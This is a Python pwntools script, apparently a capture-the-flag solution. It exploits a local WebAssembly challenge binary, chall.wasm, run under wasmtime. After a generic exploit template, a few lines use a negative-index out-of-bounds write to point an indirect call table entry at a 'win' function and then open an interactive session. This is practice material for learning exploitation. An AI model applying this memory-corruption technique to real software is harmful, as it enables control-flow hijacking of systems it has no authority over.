from pwn import *
from icecream import ic

# Set up pwntools for the correct architecture
# exe = "./"
# libc = ELF("")
# context.binary = elf = ELF(exe)
# context.log_level = "debug"
# context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("", )
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
    c
'''.format(**locals())

def sl(a): return r.sendline(a)
def s(a): return r.send(a)
def sa(a, b): return r.sendafter(a, b)
def sla(a, b): return r.sendlineafter(a, b)
def re(a): return r.recv(a)
def ru(a): return r.recvuntil(a)
def rl(): return r.recvline()
def i(): return r.interactive()

r = process(["./wasmtime-v16.0.0-x86_64-linux/wasmtime", "--dir", ".", "chall.wasm"])

sl(cyclic(16) + p32(-12, signed=True))
ru(b"joke!\n")
sl(b"1") #edit name
ru(b"there?")
sl(b"2") #value to write, in our case 2 is the index of `win` in the indirect call table
ru(b"joke!\n")
sl(b"3") 

r.interactive()
